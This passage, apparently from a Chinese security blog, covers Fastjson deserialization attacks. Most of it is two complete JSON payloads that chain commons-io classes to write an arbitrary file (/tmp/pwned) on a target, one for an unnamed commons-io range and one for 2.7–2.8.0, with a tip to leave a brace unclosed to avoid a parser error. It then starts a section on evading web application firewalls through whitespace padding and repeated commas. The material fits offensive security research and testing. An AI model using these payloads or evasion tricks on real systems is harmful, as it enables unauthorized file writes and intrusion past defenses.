<div class="code-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;x&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.alibaba.fastjson.JSONObject&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;input&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.input.ReaderInputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;reader&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.input.CharSequenceReader&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;charSequence&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.String&quot;</span><span class="string">&quot;aaaaaa...(长度要大于8192，实际写入前8192个字符)&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;charsetName&quot;</span><span class="punctuation">:</span><span class="string">&quot;UTF-8&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;bufferSize&quot;</span><span class="punctuation">:</span><span class="number">1024</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;branch&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.output.WriterOutputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;writer&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.output.FileWriterWithEncoding&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;file&quot;</span><span class="punctuation">:</span><span class="string">&quot;/tmp/pwned&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;encoding&quot;</span><span class="punctuation">:</span><span class="string">&quot;UTF-8&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;append&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;charsetName&quot;</span><span class="punctuation">:</span><span class="string">&quot;UTF-8&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;bufferSize&quot;</span><span class="punctuation">:</span> <span class="number">1024</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;writeImmediately&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;trigger&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.input.XmlStreamReader&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;is&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.input.TeeInputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;input&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span><span class="string">&quot;$.input&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;branch&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span><span class="string">&quot;$.branch&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;closeBranch&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;httpContentType&quot;</span><span class="punctuation">:</span><span class="string">&quot;text/xml&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;lenient&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;defaultEncoding&quot;</span><span class="punctuation">:</span><span class="string">&quot;UTF-8&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;trigger2&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.input.XmlStreamReader&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;is&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.input.TeeInputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;input&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span><span class="string">&quot;$.input&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;branch&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span><span class="string">&quot;$.branch&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;closeBranch&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;httpContentType&quot;</span><span class="punctuation">:</span><span class="string">&quot;text/xml&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;lenient&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;defaultEncoding&quot;</span><span class="punctuation">:</span><span class="string">&quot;UTF-8&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;trigger3&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.input.XmlStreamReader&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;is&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.input.TeeInputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;input&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span><span class="string">&quot;$.input&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;branch&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span><span class="string">&quot;$.branch&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;closeBranch&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;httpContentType&quot;</span><span class="punctuation">:</span><span class="string">&quot;text/xml&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;lenient&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;defaultEncoding&quot;</span><span class="punctuation">:</span><span class="string">&quot;UTF-8&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>

<p>最后括号不闭合可以避免下面这个报错：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Exception in thread &quot;main&quot; com.alibaba.fastjson.JSONException: not close json text, token : &#125;</span><br><span class="line">    at com.alibaba.fastjson.parser.DefaultJSONParser.close(DefaultJSONParser.java:1527)</span><br><span class="line">    at com.alibaba.fastjson.JSON.parse(JSON.java:187)</span><br><span class="line">    at com.alibaba.fastjson.JSON.parse(JSON.java:193)</span><br><span class="line">    at com.alibaba.fastjson.JSON.parse(JSON.java:149)</span><br><span class="line">    at Main.main(Main.java:162)</span><br></pre></td></tr></table></figure></div>

    </div>
  </div>

<p>commons-io 2.7 - 2.8.0 版本：</p>
<div class="code-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;x&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.alibaba.fastjson.JSONObject&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;input&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.input.ReaderInputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;reader&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.input.CharSequenceReader&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;charSequence&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.String&quot;</span><span class="string">&quot;aaaaaa...(长度要大于8192，实际写入前8192个字符)&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;start&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;end&quot;</span><span class="punctuation">:</span><span class="number">2147483647</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;charsetName&quot;</span><span class="punctuation">:</span><span class="string">&quot;UTF-8&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;bufferSize&quot;</span><span class="punctuation">:</span><span class="number">1024</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;branch&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.output.WriterOutputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;writer&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.output.FileWriterWithEncoding&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;file&quot;</span><span class="punctuation">:</span><span class="string">&quot;/tmp/pwned&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;charsetName&quot;</span><span class="punctuation">:</span><span class="string">&quot;UTF-8&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;append&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;charsetName&quot;</span><span class="punctuation">:</span><span class="string">&quot;UTF-8&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;bufferSize&quot;</span><span class="punctuation">:</span> <span class="number">1024</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;writeImmediately&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;trigger&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.input.XmlStreamReader&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;inputStream&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.input.TeeInputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;input&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span><span class="string">&quot;$.input&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;branch&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span><span class="string">&quot;$.branch&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;closeBranch&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;httpContentType&quot;</span><span class="punctuation">:</span><span class="string">&quot;text/xml&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;lenient&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;defaultEncoding&quot;</span><span class="punctuation">:</span><span class="string">&quot;UTF-8&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;trigger2&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.input.XmlStreamReader&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;inputStream&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.input.TeeInputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;input&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span><span class="string">&quot;$.input&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;branch&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span><span class="string">&quot;$.branch&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;closeBranch&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;httpContentType&quot;</span><span class="punctuation">:</span><span class="string">&quot;text/xml&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;lenient&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;defaultEncoding&quot;</span><span class="punctuation">:</span><span class="string">&quot;UTF-8&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;trigger3&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.input.XmlStreamReader&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;inputStream&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.input.TeeInputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;input&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span><span class="string">&quot;$.input&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;branch&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span><span class="string">&quot;$.branch&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;closeBranch&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;httpContentType&quot;</span><span class="punctuation">:</span><span class="string">&quot;text/xml&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;lenient&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;defaultEncoding&quot;</span><span class="punctuation">:</span><span class="string">&quot;UTF-8&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>

<h1 id="Fastjson-绕-waf"><a href="#Fastjson-绕-waf" class="headerlink" title="Fastjson 绕 waf"></a>Fastjson 绕 waf</h1><h2 id="添加空白字符"><a href="#添加空白字符" class="headerlink" title="添加空白字符"></a>添加空白字符</h2><p>在 <code>com.alibaba.fastjson.parser.JSONLexerBase#skipWhitespace</code> 不难看出默认会去除键、值外的空格、<code>\b</code>、<code>\n</code>、<code>\r</code>、<code>\f</code> 等。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 跳过空白字符和注释。</span></span><br><span class="line"><span class="comment"> * 该方法会不断检查并跳过空白字符（如空格、回车、换行、制表符、换页符、退格符）和单行注释（以“/”开头）。</span></span><br><span class="line"><span class="comment"> * 如果遇到注释，则跳过整个注释，继续处理下一个字符。</span></span><br><span class="line"><span class="comment"> * 当遇到非空白字符和非注释字符时，停止跳过，方法执行完毕。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">skipWhitespace</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        <span class="comment">// 如果当前字符小于或等于 &#x27;/&#x27;，则继续判断是否为空白字符或注释</span></span><br><span class="line">        <span class="keyword">if</span> (ch &lt;= <span class="string">&#x27;/&#x27;</span>) &#123;</span><br><span class="line">            <span class="comment">// 如果当前字符是空白字符（空格、回车、换行、制表符、换页符、退格符），则跳到下一个字符</span></span><br><span class="line">            <span class="keyword">if</span> (ch == <span class="string">&#x27; &#x27;</span> || ch == <span class="string">&#x27;\r&#x27;</span> || ch == <span class="string">&#x27;\n&#x27;</span> || ch == <span class="string">&#x27;\t&#x27;</span> || ch == <span class="string">&#x27;\f&#x27;</span> || ch == <span class="string">&#x27;\b&#x27;</span>) &#123;</span><br><span class="line">                next();  <span class="comment">// 调用 next() 方法获取下一个字符</span></span><br><span class="line">                <span class="keyword">continue</span>;  <span class="comment">// 继续跳过空白字符</span></span><br><span class="line">            &#125; </span><br><span class="line">            <span class="comment">// 如果当前字符是 &#x27;/&#x27;, 则是注释，跳过注释</span></span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (ch == <span class="string">&#x27;/&#x27;</span>) &#123;</span><br><span class="line">                skipComment();  <span class="comment">// 调用 skipComment() 方法跳过注释</span></span><br><span class="line">                <span class="keyword">continue</span>;  <span class="comment">// 继续跳过注释</span></span><br><span class="line">            &#125; </span><br><span class="line">            <span class="comment">// 如果不是空白字符和注释，退出循环</span></span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="comment">// 如果当前字符大于 &#x27;/&#x27;，说明遇到非空白字符或注释，退出循环</span></span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="添加多个逗号"><a href="#添加多个逗号" class="headerlink" title="添加多个逗号"></a>添加多个逗号</h2><p>FastJson 中有个默认的 Feature 是开启的 <code>AllowArbitraryCommas</code>，这允许我们用多个逗号。</p>
